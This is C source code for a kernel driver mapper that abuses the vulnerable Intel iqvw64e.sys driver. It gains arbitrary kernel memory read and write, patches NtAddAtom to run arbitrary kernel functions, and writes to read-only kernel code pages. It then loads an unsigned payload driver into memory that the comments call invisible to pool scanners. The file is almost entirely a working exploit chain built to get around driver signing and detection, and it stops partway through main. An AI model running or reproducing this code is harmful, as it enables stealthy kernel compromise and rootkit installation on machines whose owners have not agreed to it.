/*
 * mapper.c -- BYOVD kernel mapper using MmAllocateIndependentPagesEx
 *
 * ExAllocatePool2 allocations appear in SystemBigPoolInformation (class 66).
 * MmAllocateIndependentPagesEx pulls pages directly from the PFN database --
 * no pool headers, no big-pool entry. Pool scanners see nothing.
 *
 * Requires: iqvw64e.sys + payload.sys in same dir, admin privs, test signing off.
 */

#define WIN32_LEAN_AND_MEAN
#include <Windows.h>
#include <winternl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#pragma comment(lib, "advapi32.lib")

/* NAL IOCTL and case numbers (verified against iqvw64e.sys v1.3.1.0) */
#define NAL_IOCTL            0x80862007UL
#define NAL_CASE_MEMCOPY     0x33
#define NAL_CASE_GETPHYS     0x25
#define NAL_CASE_MAPIO       0x19
#define NAL_CASE_UNMAPIO     0x1A

#define SystemBigPoolInformation  66
#define POOL_TAG                  'pmaC'
#define EXEC_MAGIC                0x600DC0DEU
#define POOL_FLAG_NON_PAGED       0x0000000000000040ULL

/* -- NAL IOCTL buffer layouts -------------------------------------------- */

#pragma pack(push, 1)

typedef struct {
    UINT64 case_number;
    UINT64 reserved;
    UINT64 source;
    UINT64 destination;
    UINT64 length;
} NAL_COPY_BUF;

typedef struct {
    UINT64 case_number;
    UINT64 reserved;
    UINT64 return_physical_address;
    UINT64 address_to_translate;
} NAL_GETPHYS_BUF;

typedef struct {
    UINT64 case_number;
    UINT64 reserved;
    UINT64 return_value;            /* scratch,  offset 16 */
    UINT64 return_virtual_address;  /* output,   offset 24 */
    UINT64 physical_address;        /* input,    offset 32 */
    UINT32 size;                    /* input,    offset 40 */
} NAL_MAPIO_BUF;

typedef struct {
    UINT64 case_number;
    UINT64 reserved;
    UINT64 reserved2;               /* extra field, offset 16 */
    UINT64 virtual_address;         /* input,       offset 24 */
    UINT32 size;                    /* input,       offset 32 */
} NAL_UNMAPIO_BUF;

#pragma pack(pop)

typedef NTSTATUS (NTAPI *NtQuerySystemInformation_t)(ULONG, PVOID, ULONG, PULONG);
static NtQuerySystemInformation_t g_NtQSI = NULL;

typedef struct {
    union {
        PVOID     VirtualAddress;
        ULONG_PTR NonPaged : 1;   /* bit 0: 1=NonPaged */
    } Va;
    SIZE_T SizeInBytes;
    UCHAR  Tag[4];
    ULONG  Reserved;
} SYSTEM_BIGPOOL_ENTRY;

typedef struct {
    ULONG              Count;
    SYSTEM_BIGPOOL_ENTRY AllocatedInfo[1];
} SYSTEM_BIGPOOL_INFORMATION;

/* -- NAL primitives ------------------------------------------------------- */

static BOOL nal_read(HANDLE hDev, UINT64 kva, void *buf, UINT64 size)
{
    NAL_COPY_BUF req = {0};
    req.case_number = NAL_CASE_MEMCOPY;
    req.source      = kva;
    req.destination = (UINT64)(ULONG_PTR)buf;
    req.length      = size;
    DWORD nb = 0;
    return DeviceIoControl(hDev, NAL_IOCTL, &req, sizeof(req), NULL, 0, &nb, NULL);
}

static BOOL nal_write(HANDLE hDev, UINT64 kva, const void *buf, UINT64 size)
{
    NAL_COPY_BUF req = {0};
    req.case_number = NAL_CASE_MEMCOPY;
    req.source      = (UINT64)(ULONG_PTR)buf;
    req.destination = kva;
    req.length      = size;
    DWORD nb = 0;
    return DeviceIoControl(hDev, NAL_IOCTL, &req, sizeof(req), NULL, 0, &nb, NULL);
}

static BOOL nal_get_physical(HANDLE hDev, UINT64 kva, UINT64 *out_pa)
{
    NAL_GETPHYS_BUF req = {0};
    req.case_number          = NAL_CASE_GETPHYS;
    req.address_to_translate = kva;
    DWORD nb = 0;
    if (!DeviceIoControl(hDev, NAL_IOCTL, &req, sizeof(req), NULL, 0, &nb, NULL))
        return FALSE;
    *out_pa = req.return_physical_address;
    return *out_pa != 0;
}

static UINT64 nal_map_io(HANDLE hDev, UINT64 pa, UINT32 size)
{
    NAL_MAPIO_BUF req = {0};
    req.case_number      = NAL_CASE_MAPIO;
    req.physical_address = pa;
    req.size             = size;
    DWORD nb = 0;
    if (!DeviceIoControl(hDev, NAL_IOCTL, &req, sizeof(req), NULL, 0, &nb, NULL))
        return 0;
    return req.return_virtual_address;
}

static BOOL nal_unmap_io(HANDLE hDev, UINT64 kva, UINT32 size)
{
    NAL_UNMAPIO_BUF req = {0};
    req.case_number    = NAL_CASE_UNMAPIO;
    req.virtual_address = kva;
    req.size           = size;
    DWORD nb = 0;
    return DeviceIoControl(hDev, NAL_IOCTL, &req, sizeof(req), NULL, 0, &nb, NULL);
}

/*
 * Write to a read-only kernel page. CR0.WP blocks direct writes to
 * supervisor read-only pages even from kernel context. Get the PA, map it
 * with MmMapIoSpace (returns a fresh writable VA to the same frame),
 * write through that, unmap. Page-aligned input required.
 */
static BOOL nal_write_ro(HANDLE hDev, UINT64 kva, const void *buf, UINT32 size)
{
    UINT64 pa = 0;
    if (!nal_get_physical(hDev, kva, &pa)) return FALSE;

    UINT64 pa_page  = pa & ~(UINT64)0xFFF;
    UINT32 page_off = (UINT32)(pa & 0xFFF);

    UINT64 mapped = nal_map_io(hDev, pa_page, 0x1000);
    if (!mapped) return FALSE;

    BOOL ok = nal_write(hDev, mapped + page_off, buf, size);
    nal_unmap_io(hDev, mapped, 0x1000);
    return ok;
}

/*
 * Call a kernel function (up to 4 args) via NtAddAtom patch.
 *
 * Overwrite the first 12 bytes of kernel NtAddAtom with:
 *   48 B8 <target>   mov rax, target
 *   FF E0            jmp rax
 * then invoke ntdll!NtAddAtom from user mode. The syscall routes to the
 * patched handler which jumps to target. The x64 calling convention puts
 * args in rcx/rdx/r8/r9, which survive the syscall boundary unchanged.
 * Restore original bytes immediately after. Kernel code pages are written
 * via nal_write_ro (physical address trick).
 *
 * Stack-based args (5th+) arent preserved across the syscall boundary.
 */
static UINT64 nal_call_kernel(HANDLE hDev, UINT64 ntaddatom, UINT64 target,
                               UINT64 a1, UINT64 a2, UINT64 a3, UINT64 a4)
{
    UINT8 shell[12] = { 0x48, 0xB8, 0,0,0,0,0,0,0,0, 0xFF, 0xE0 };
    memcpy(&shell[2], &target, 8);

    UINT8 orig[12] = {0};
    if (!nal_read(hDev, ntaddatom, orig, 12)) return 0;

    if (orig[0] == 0x48 && orig[1] == 0xB8 && orig[10] == 0xFF && orig[11] == 0xE0) {
        printf("  [!] NtAddAtom already patched\n");
        return 0;
    }

    if (!nal_write_ro(hDev, ntaddatom, shell, 12)) return 0;

    typedef UINT64 (NTAPI *Fn4_t)(UINT64, UINT64, UINT64, UINT64);
    Fn4_t fn = (Fn4_t)(ULONG_PTR)GetProcAddress(
                   GetModuleHandleA("ntdll.dll"), "NtAddAtom");

    UINT64 result = fn(a1, a2, a3, a4);
    nal_write_ro(hDev, ntaddatom, orig, 12);
    return result;
}

/* -- ntoskrnl helpers ----------------------------------------------------- */

static UINT64 find_ntoskrnl_base(void)
{
    ULONG size = 0;
    g_NtQSI(11, NULL, 0, &size);
    if (!size) return 0;
    size += 0x1000;

    BYTE *buf = (BYTE*)malloc(size);
    if (!buf) return 0;

    NTSTATUS st = g_NtQSI(11, buf, size, &size);
    UINT64 base = (st == 0) ? *(UINT64*)(buf + 8 + 0x10) : 0;
    free(buf);
    return base;
}

static UINT64 get_export(HANDLE hDev, UINT64 module_base, const char *name)
{
    IMAGE_DOS_HEADER dos = {0};
    if (!nal_read(hDev, module_base, &dos, sizeof(dos))) return 0;
    if (dos.e_magic != IMAGE_DOS_SIGNATURE) return 0;

    IMAGE_NT_HEADERS64 nt = {0};
    if (!nal_read(hDev, module_base + dos.e_lfanew, &nt, sizeof(nt))) return 0;
    if (nt.Signature != IMAGE_NT_SIGNATURE) return 0;

    DWORD exp_rva  = nt.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    DWORD exp_size = nt.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;
    if (!exp_rva || !exp_size) return 0;

    BYTE *exp = (BYTE*)malloc(exp_size);
    if (!exp) return 0;
    if (!nal_read(hDev, module_base + exp_rva, exp, exp_size)) { free(exp); return 0; }

    IMAGE_EXPORT_DIRECTORY *ed = (IMAGE_EXPORT_DIRECTORY*)exp;
    DWORD  *names = (DWORD*) (exp + (ed->AddressOfNames        - exp_rva));
    USHORT *ords  = (USHORT*)(exp + (ed->AddressOfNameOrdinals - exp_rva));
    DWORD  *funcs = (DWORD*) (exp + (ed->AddressOfFunctions    - exp_rva));

    UINT64 result = 0;
    for (DWORD i = 0; i < ed->NumberOfNames; i++) {
        const char *fn = (const char*)(exp + (names[i] - exp_rva));
        if (_stricmp(fn, name) == 0) {
            DWORD rva = funcs[ords[i]];
            if (rva < exp_rva || rva >= exp_rva + exp_size)
                result = module_base + rva;
            break;
        }
    }

    free(exp);
    return result;
}

/* Find a PE section by name; returns kernel VA and writes virtual size. */
static UINT64 find_section(HANDLE hDev, UINT64 module_base,
                            const char *name, UINT32 *out_size)
{
    IMAGE_DOS_HEADER dos = {0};
    IMAGE_NT_HEADERS64 nt = {0};
    nal_read(hDev, module_base, &dos, sizeof(dos));
    nal_read(hDev, module_base + dos.e_lfanew, &nt, sizeof(nt));

    UINT64 shdr = module_base + dos.e_lfanew
                + FIELD_OFFSET(IMAGE_NT_HEADERS64, OptionalHeader)
                + nt.FileHeader.SizeOfOptionalHeader;

    WORD n = nt.FileHeader.NumberOfSections;
    if (n > 64) n = 64;

    IMAGE_SECTION_HEADER s[64] = {0};
    nal_read(hDev, shdr, s, sizeof(IMAGE_SECTION_HEADER) * n);

    for (WORD i = 0; i < n; i++) {
        if (strncmp((char*)s[i].Name, name, 8) == 0) {
            *out_size = s[i].Misc.VirtualSize;
            return module_base + s[i].VirtualAddress;
        }
    }
    return 0;
}

/* Scan section for masked byte pattern ('x'=match, '?'=wildcard); 64 KB chunks. */
#define CHUNK 0x10000

static UINT64 pattern_scan(HANDLE hDev, UINT64 va, UINT32 size,
                            const BYTE *pat, const char *mask)
{
    size_t len = strlen(mask);
    if (!len || size < len) return 0;

    BYTE *buf = (BYTE*)malloc(CHUNK);
    if (!buf) return 0;

    for (UINT32 off = 0; off < size; ) {
        UINT32 rd = (UINT32)(CHUNK < size - off ? CHUNK : size - off);
        if (!nal_read(hDev, va + off, buf, rd)) { off += rd; continue; }

        UINT32 end = rd > len - 1 ? rd - (UINT32)(len - 1) : 0;
        for (UINT32 i = 0; i < end; i++) {
            BOOL ok = TRUE;
            for (size_t j = 0; j < len; j++) {
                if (mask[j] == 'x' && buf[i + j] != pat[j]) { ok = FALSE; break; }
            }
            if (ok) { free(buf); return va + off + i; }
        }
        off += end;
    }

    free(buf);
    return 0;
}

/* Reolve E8 displacement: instr_va+off holds the 4-byte relative displacement. */
static UINT64 resolve_call(HANDLE hDev, UINT64 instr_va, UINT32 off, UINT32 instr_size)
{
    INT32 disp = 0;
    if (!nal_read(hDev, instr_va + off, &disp, 4)) return 0;
    return instr_va + instr_size + (INT64)disp;
}

/* -- find undocumented ntoskrnl functions --------------------------------- */

static UINT64 find_MmAllocateIndependentPagesEx(HANDLE hDev, UINT64 base)
{
    UINT32 size = 0;
    UINT64 va   = find_section(hDev, base, ".text", &size);
    if (!va) return 0;

    /*
     * Call site inside KeAllocateInterrupt (.text), stable 1803-24H2:
     *   41 8B D6             mov r10d, r14d
     *   B9 00 10 00 00       mov ecx, 0x1000    <- anchor
     *   E8 xx xx xx xx       call MmAllocateIndependentPagesEx
     *   48 8B D8             mov rbx, rax
     */
    static const BYTE pat[] = {
        0x41,0x8B,0xD6,
        0xB9,0x00,0x10,0x00,0x00,
        0xE8,0x00,0x00,0x00,0x00,
        0x48,0x8B,0xD8
    };
    static const char mask[] = "xxxxxxxxx????xxx";

    UINT64 m = pattern_scan(hDev, va, size, pat, mask);
    if (!m) { printf("  [!] MmAllocateIndependentPagesEx not found\n"); return 0; }
    return resolve_call(hDev, m + 8, 1, 5);
}

static UINT64 find_MmFreeIndependentPages(HANDLE hDev, UINT64 base, UINT64 fn_alloc)
{
    /* Primary: PAGE section call-site pattern */
    {
        UINT32 size = 0;
        UINT64 va   = find_section(hDev, base, "PAGE", &size);
        if (va && size) {
            static const BYTE pat[] = {
                0xBA,0x00,0x60,0x00,0x00,
                0x48,0x8B,0xCB,
                0xE8,0x00,0x00,0x00,0x00,
                0x48,0x8D,0x8B,0x00,0xF0,0xFF,0xFF
            };
            static const char mask[] = "xxxxxxxxx????xxxxxxx";
            UINT64 m = pattern_scan(hDev, va, size, pat, mask);
            if (m) return resolve_call(hDev, m + 8, 1, 5);
        }
    }

    if (!fn_alloc) return 0;

    /*
     * Fallback: binary search over .pdata (sorted by BeginAddress, x64 ABI).
     * MmFreeIndependentPages is compiled from the same TU and sits immediatly
     * after MmAllocateIndependentPagesEx in .pdata. O(log N) point reads.
     */
    UINT32 pdata_size = 0;
    UINT64 pdata_va   = find_section(hDev, base, ".pdata", &pdata_size);
    if (!pdata_va || pdata_size < 24) return 0;

    UINT32 count     = pdata_size / 12;
    UINT32 alloc_rva = (UINT32)(fn_alloc - base);
    UINT32 lo = 0, hi = count;

    while (lo < hi) {
        UINT32 mid = (lo + hi) / 2;
        UINT64 eva = pdata_va + (UINT64)mid * 12;
        DWORD  e[3] = {0};
        if (!nal_read(hDev, eva, e, 12)) return 0;

        if (e[0] == alloc_rva) {
            if (mid + 1 >= count) return 0;
            DWORD nxt[3] = {0};
            if (!nal_read(hDev, eva + 12, nxt, 12)) return 0;
            return base + nxt[0];
        } else if (e[0] < alloc_rva) {
            lo = mid + 1;
        } else {
            hi = mid;
        }
    }
    return 0;
}

/* PAGELK section call site for MmSetPageProtection (cmovnz anchor). */
static UINT64 find_MmSetPageProtection(HANDLE hDev, UINT64 base)
{
    UINT32 size = 0;
    UINT64 va   = find_section(hDev, base, "PAGELK", &size);
    if (!va) return 0;

    static const BYTE pat1[] = {
        0x0F,0x45,0x00,0x00, 0x8D,0x00,0x00,0x00,0xFF,0xFF, 0xE8
    };
    static const char mask1[] = "xx??x???xxx";

    UINT64 m = pattern_scan(hDev, va, size, pat1, mask1);
    if (m) return resolve_call(hDev, m + 10, 1, 5);

    static const BYTE pat2[] = {
        0x0F,0x45,0x00,0x00,
        0x45,0x8B,0x00,0x00,0x00,0x00,
        0x8D,0x00,0x00,0x00,0x00,0x00,0x00,
        0xFF,0xFF,0xE8
    };
    static const char mask2[] = "xx??xx????x???xxx";
    m = pattern_scan(hDev, va, size, pat2, mask2);
    if (!m) return 0;
    return resolve_call(hDev, m + 19, 1, 5);
}

/* -- PE loading ----------------------------------------------------------- */

/* Only IMAGE_REL_BASED_DIR64 (type 10) is used in 64-bit kernel drivers. */
static BOOL pe_fix_relocations(BYTE *base, INT64 delta)
{
    PIMAGE_NT_HEADERS64 nt = (PIMAGE_NT_HEADERS64)(base + ((PIMAGE_DOS_HEADER)base)->e_lfanew);
    DWORD rva = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress;
    DWORD rsz = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;
    if (!rva || !rsz) return TRUE;

    BYTE *p = base + rva, *end = p + rsz;
    while (p < end) {
        PIMAGE_BASE_RELOCATION blk = (PIMAGE_BASE_RELOCATION)p;
        if (!blk->VirtualAddress || blk->SizeOfBlock < sizeof(*blk)) break;

        DWORD n   = (blk->SizeOfBlock - sizeof(*blk)) / sizeof(WORD);
        WORD *ent = (WORD*)(p + sizeof(*blk));
        for (DWORD i = 0; i < n; i++) {
            if (ent[i] >> 12 == IMAGE_REL_BASED_DIR64)
                *(UINT64*)(base + blk->VirtualAddress + (ent[i] & 0xFFF)) += delta;
        }
        p += blk->SizeOfBlock;
    }
    return TRUE;
}

/* Walk the IAT; resolve each symbol via NAL export scan. ntoskrnl.exe only. */
static BOOL pe_resolve_imports(HANDLE hDev, BYTE *base, UINT64 ntoskrnl)
{
    PIMAGE_NT_HEADERS64 nt = (PIMAGE_NT_HEADERS64)(base + ((PIMAGE_DOS_HEADER)base)->e_lfanew);
    DWORD rva = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;
    if (!rva) return TRUE;

    for (PIMAGE_IMPORT_DESCRIPTOR d = (PIMAGE_IMPORT_DESCRIPTOR)(base + rva);
         d->Name; d++) {
        const char *mod = (const char*)(base + d->Name);
        if (_stricmp(mod, "ntoskrnl.exe") != 0) continue;
        printf("  -> imports from %s\n", mod);

        PIMAGE_THUNK_DATA64 ilt = (PIMAGE_THUNK_DATA64)(base + d->OriginalFirstThunk);
        PIMAGE_THUNK_DATA64 iat = (PIMAGE_THUNK_DATA64)(base + d->FirstThunk);

        for (; ilt->u1.AddressOfData; ilt++, iat++) {
            if (IMAGE_SNAP_BY_ORDINAL64(ilt->u1.Ordinal)) return FALSE;
            const char *fn = (const char*)
                ((PIMAGE_IMPORT_BY_NAME)(base + (DWORD)ilt->u1.AddressOfData))->Name;
            UINT64 addr = get_export(hDev, ntoskrnl, fn);
            if (!addr) { printf("  [!] unresolved: %s\n", fn); return FALSE; }
            iat->u1.Function = addr;
            printf("     %s -> 0x%llx\n", fn, addr);
        }
    }
    return TRUE;
}

/* MSVC default __security_cookie is 0x2B992DDFA232; replace it before calling /GS funcitons. */
static void pe_fix_cookie(BYTE *base, UINT64 kbase)
{
    static const UINT64 DEFAULT = 0x2B992DDFA232ULL;
    PIMAGE_NT_HEADERS64 nt = (PIMAGE_NT_HEADERS64)(base + ((PIMAGE_DOS_HEADER)base)->e_lfanew);
    DWORD rva = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG].VirtualAddress;
    if (!rva) return;

    PIMAGE_LOAD_CONFIG_DIRECTORY64 lc = (PIMAGE_LOAD_CONFIG_DIRECTORY64)(base + rva);
    if (!lc->SecurityCookie) return;

    UINT64 off = lc->SecurityCookie - kbase;
    if (off >= nt->OptionalHeader.SizeOfImage) return;

    UINT64 *cookie = (UINT64*)(base + off);
    if (*cookie != DEFAULT) return;

    *cookie = DEFAULT ^ GetCurrentProcessId() ^ GetCurrentThreadId();
    if (*cookie == DEFAULT) *cookie ^= 1;
}

/* -- pool visibility scanner ---------------------------------------------- */

static BOOL scan_bigpool(UINT64 addr)
{
    SYSTEM_BIGPOOL_INFORMATION *info = NULL;
    NTSTATUS st;
    ULONG size = 0x20000;

    for (int i = 0; i < 10; i++) {
        free(info);
        info = (SYSTEM_BIGPOOL_INFORMATION*)malloc(size);
        if (!info) return FALSE;

        ULONG ret = 0;
        st = g_NtQSI(SystemBigPoolInformation, info, size, &ret);
        if (st == 0) break;
        if ((ULONG)st != 0xC0000004UL) { free(info); return FALSE; }
        size = ret > size ? ret + 0x1000 : size * 2;
    }
    if (st) { free(info); return FALSE; }

    printf("  BigPoolInformation: %lu entries\n", info->Count);

    for (ULONG i = 0; i < info->Count; i++) {
        UINT64 va = (UINT64)(ULONG_PTR)info->AllocatedInfo[i].Va.VirtualAddress & ~1ULL;
        SIZE_T sz = info->AllocatedInfo[i].SizeInBytes;
        if (addr >= va && addr < va + sz) {
            printf("  [FOUND]  0x%llx in entry 0x%llx  size=0x%zx  tag='%.4s'\n",
                   addr, va, sz, (char*)info->AllocatedInfo[i].Tag);
            free(info);
            return TRUE;
        }
    }

    printf("  [NOT FOUND]  0x%llx\n", addr);
    free(info);
    return FALSE;
}

/* -- SCM driver loader ---------------------------------------------------- */

static BOOL load_driver(const wchar_t *path, const wchar_t *svc_name, HANDLE *out)
{
    SC_HANDLE scm = OpenSCManagerW(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
    if (!scm) return FALSE;

    SC_HANDLE svc = OpenServiceW(scm, svc_name, SERVICE_ALL_ACCESS);
    if (svc) {
        SERVICE_STATUS ss = {0};
        ControlService(svc, SERVICE_CONTROL_STOP, &ss);
        DeleteService(svc);
        CloseServiceHandle(svc);
        Sleep(500);
    }

    svc = CreateServiceW(scm, svc_name, svc_name, SERVICE_ALL_ACCESS,
                         SERVICE_KERNEL_DRIVER, SERVICE_DEMAND_START,
                         SERVICE_ERROR_NORMAL, path,
                         NULL, NULL, NULL, NULL, NULL);
    if (!svc) { CloseServiceHandle(scm); return FALSE; }

    BOOL ok = StartServiceW(svc, 0, NULL) || GetLastError() == ERROR_SERVICE_ALREADY_RUNNING;
    CloseServiceHandle(svc);
    CloseServiceHandle(scm);

    if (!ok) return FALSE;

    *out = CreateFileW(L"\\\\.\\Nal", GENERIC_READ | GENERIC_WRITE,
                       0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    return *out != INVALID_HANDLE_VALUE;
}

static void unload_driver(HANDLE dev, const wchar_t *svc_name)
{
    CloseHandle(dev);
    SC_HANDLE scm = OpenSCManagerW(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
    if (!scm) return;
    SC_HANDLE svc = OpenServiceW(scm, svc_name, SERVICE_ALL_ACCESS);
    if (svc) {
        SERVICE_STATUS ss = {0};
        ControlService(svc, SERVICE_CONTROL_STOP, &ss);
        Sleep(500);
        DeleteService(svc);
        CloseServiceHandle(svc);
    }
    CloseServiceHandle(scm);
}

/* -- mapper ---------------------------------------------------------------
 *   use_indpages=TRUE  -> MmAllocateIndependentPagesEx  (invisible to pool scans)
 *   use_indpages=FALSE -> ExAllocatePool2               (visible in pool scans)
 */
static UINT64 map_driver(HANDLE hDev, UINT64 ntoskrnl, UINT64 ntaddatom,
                          UINT64 fn_indpages, UINT64 fn_pool, UINT64 fn_setprot,
                          const BYTE *data, BOOL use_indpages)
{
    PIMAGE_NT_HEADERS64 nth = (PIMAGE_NT_HEADERS64)(data + ((PIMAGE_DOS_HEADER)data)->e_lfanew);
    if (nth->Signature != IMAGE_NT_SIGNATURE ||
        nth->OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR64_MAGIC)
        return 0;

    UINT32 imgsz   = nth->OptionalHeader.SizeOfImage;
    UINT64 imgbase = nth->OptionalHeader.ImageBase;

    BYTE *local = (BYTE*)calloc(imgsz, 1);
    if (!local) return 0;

    memcpy(local, data, nth->OptionalHeader.SizeOfHeaders);

    PIMAGE_SECTION_HEADER s = IMAGE_FIRST_SECTION(nth);
    for (WORD i = 0; i < nth->FileHeader.NumberOfSections; i++) {
        if (!s[i].PointerToRawData || !s[i].SizeOfRawData) continue;
        if (s[i].Characteristics & IMAGE_SCN_CNT_UNINITIALIZED_DATA) continue;
        memcpy(local + s[i].VirtualAddress,
               data  + s[i].PointerToRawData,
               s[i].SizeOfRawData);
    }

    UINT64 kbase = 0;
    if (use_indpages) {
        printf("  -> MmAllocateIndependentPagesEx (%u bytes)\n", imgsz);
        /* PVOID MmAllocateIndependentPagesEx(SIZE_T, ULONG_PTR Node, ULONG_PTR, ULONG_PTR)
         * Node = -1 selects any NUMA node. */
        kbase = nal_call_kernel(hDev, ntaddatom, fn_indpages,
                                (UINT64)imgsz, (UINT64)-1, 0, 0);
    } else {
        printf("  -> ExAllocatePool2 (%u bytes)\n", imgsz);
        kbase = nal_call_kernel(hDev, ntaddatom, fn_pool,
                                POOL_FLAG_NON_PAGED, (UINT64)imgsz, POOL_TAG, 0);
    }

    if (!kbase) { printf("  [!] allocation failed\n"); free(local); return 0; }
    printf("  -> base: 0x%llx\n", kbase);

    pe_fix_relocations(local, (INT64)(kbase - imgbase));
    pe_fix_cookie(local, kbase);

    if (!pe_resolve_imports(hDev, local, ntoskrnl)) { free(local); return 0; }
    if (!nal_write(hDev, kbase, local, imgsz)) {
        printf("  [!] kernel write failed\n");
        free(local);
        return 0;
    }
    free(local);

    if (use_indpages && fn_setprot) {
        PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nth);
        for (WORD i = 0; i < nth->FileHeader.NumberOfSections; i++) {
            if (!sec[i].Misc.VirtualSize) continue;
            DWORD prot = PAGE_READONLY;
            if (sec[i].Characteristics & IMAGE_SCN_MEM_EXECUTE)
                prot = (sec[i].Characteristics & IMAGE_SCN_MEM_WRITE)
                       ? PAGE_EXECUTE_READWRITE : PAGE_EXECUTE_READ;
            else if (sec[i].Characteristics & IMAGE_SCN_MEM_WRITE)
                prot = PAGE_READWRITE;
            printf("  -> MmSetPageProtection %.8s prot=0x%lx\n",
                   (char*)sec[i].Name, prot);
            nal_call_kernel(hDev, ntaddatom, fn_setprot,
                            kbase + sec[i].VirtualAddress,
                            (UINT64)sec[i].Misc.VirtualSize, (UINT64)prot, 0);
        }
    }

    return kbase;
}

/* -- main ----------------------------------------------------------------- */

int main(int argc, char **argv)
{
    (void)argc; (void)argv;

    g_NtQSI = (NtQuerySystemInformation_t)(ULONG_PTR)
              GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQuerySystemInformation");
    if (!g_NtQSI) { printf("[!] NtQSI not found\n"); return 1; }

    wchar_t exe_dir[MAX_PATH] = {0};
    GetModuleFileNameW(NULL, exe_dir, MAX_PATH);
    wchar_t *sl = wcsrchr(exe_dir, L'\\');
    if (sl) *(sl + 1) = L'\0';

    wchar_t nal_path[MAX_PATH], payload_path[MAX_PATH];
    swprintf_s(nal_path,     MAX_PATH, L"%siqvw64e.sys", exe_dir);
    swprintf_s(payload_path, MAX_PATH, L"%spayload.sys",  exe_dir);

    printf("[*] NAL:     %ls\n", nal_path);

    HANDLE hFile = CreateFileW(payload_path, GENERIC_READ, FILE_SHARE_READ,
                                NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("[!] can't open payload.sys: %lu\n", GetLastError());
        return 1;
    }
    DWORD psz   = GetFileSize(hFile, NULL);
    BYTE *pdata = (BYTE*)malloc(psz);
    DWORD nr    = 0;
    ReadFile(hFile, pdata, psz, &nr, NULL);
    CloseHandle(hFile);
    printf("[*] payload: %ls  (%lu bytes)\n\n", payload_path, psz);

    HANDLE hDev = NULL;
    if (!load_driver(nal_path, L"NalDrv", &hDev)) { free(pdata); return 1; }
    printf("[+] NAL loaded  handle=%p\n\n", hDev);

    UINT64 ntoskrnl = find_ntoskrnl_base();
    if (!ntoskrnl) {
        printf("[!] ntoskrnl not found\n");
        unload_driver(hDev, L"NalDrv");
        free(pdata);
        return 1;
    }

    WORD mz = 0;
    nal_read(hDev, ntoskrnl, &mz, 2);
    if (mz != IMAGE_DOS_SIGNATURE) {
        printf("[!] MZ check failed\n");
        unload_driver(hDev, L"NalDrv");
        free(pdata);
        return 1;
    }
    printf("[+] ntoskrnl: 0x%llx\n\n", ntoskrnl);

    printf("[*] resolving...\n");
    UINT64 ntaddatom   = get_export(hDev, ntoskrnl, "NtAddAtom");
    UINT64 fn_pool     = get_export(hDev, ntoskrnl, "ExAllocatePool2");
    UINT64 fn_freepool = get_export(hDev, ntoskrnl, "ExFreePoolWithTag");
    UINT64 fn_indpages = find_MmAllocateIndependentPagesEx(hDev, ntoskrnl);
    UINT64 fn_freeind  = find_MmFreeIndependentPages(hDev, ntoskrnl, fn_indpages);
    UINT64 fn_setprot  = find_MmSetPageProtection(hDev, ntoskrnl);

    printf("  NtAddAtom:                    0x%llx\n", ntaddatom);
    printf("  ExAllocatePool2:              0x%llx\n", fn_pool);
    printf("  ExFreePoolWithTag:            0x%llx\n", fn_freepool);
    printf("  MmAllocateIndependentPagesEx: 0x%llx\n", fn_indpages);
    printf("  MmFreeIndependentPages:       0x%llx\n", fn_freeind);
    printf("  MmSetPageProtection:          0x%llx\n\n", fn_setprot);

    if (!ntaddatom || !fn_pool || !fn_indpages) {
        printf("[!] critical function missing\n");
        unload_driver(hDev, L"NalDrv");
        free(pdata);
        return 1;
    }
    if (!fn_freeind)
        printf("[!] MmFreeIndependentPages not found -- allocation will leak\n\n");

    /* Part 1: ExAllocatePool2 -- visible to pool scanners */
    printf("=== Part 1: ExAllocatePool2 (pool-visible) ===\n\n");

    UINT64 pool_base = map_driver(hDev, ntoskrnl, ntaddatom,
                                   fn_indpages, fn_pool, 0, pdata, FALSE);
    if (pool_base) {
        printf("\n[+] mapped: 0x%llx via ExAllocatePool2\n", pool_base);
        BOOL vis = scan_bigpool(pool_base);
        printf("[%s] ExAllocatePool2 allocation %s in BigPool\n\n",
               vis ? "+" : "!", vis ? "IS" : "NOT");
        if (fn_freepool) {
            nal_call_kernel(hDev, ntaddatom, fn_freepool, pool_base, POOL_TAG, 0, 0);
            printf("[*] pool freed\n\n");
        }
    }

    /* Part 2: MmAllocateIndependentPagesEx -- invisible to pool scanners */
    printf("=== Part 2: MmAllocateIndependentPagesEx (pool-invisible) ===\n\n");

    UINT64 ind_base = map_driver(hDev, ntoskrnl, ntaddatom,
                                  fn_indpages, fn_pool, fn_setprot, pdata, TRUE);
    if (!ind_base) {
        printf("[!] mapping failed\n");
        unload_driver(hDev, L"NalDrv");
        free(pdata);
        return 1;
    }

    printf("\n[+] mapped: 0x%llx via MmAllocateIndependentPagesEx\n", ind_base);
    BOOL vis = scan_bigpool(ind_base);
    printf("[%s] MmAllocateIndependentPagesEx allocation %s in BigPool\n\n",
           vis ? "!" : "+", vis ? "IS (unexpected)" : "NOT (expected)");

    PIMAGE_NT_HEADERS64 nth = (PIMAGE_NT_HEADERS64)(pdata + ((PIMAGE_DOS_HEADER)pdata)->e_lfanew);
    UINT64 entry = ind_base + nth->OptionalHeader.AddressOfEntryPoint;
    printf("[*] calling entry point 0x%llx...\n", entry);

    UINT64 status = nal_call_kernel(hDev, ntaddatom, entry, 0, 0, 0, 0);
    printf("[+] returned: 0x%llx\n", status);

    if ((UINT32)status == EXEC_MAGIC)
        printf("[+] EXEC_MAGIC 0x%08X confirmed\n\n", EXEC_MAGIC);
    else if (status == 0)
        printf("    STATUS_SUCCESS -- check DebugView\n\n");
    else
        printf("    unexpected status\n\n");

    if (fn_freeind) {
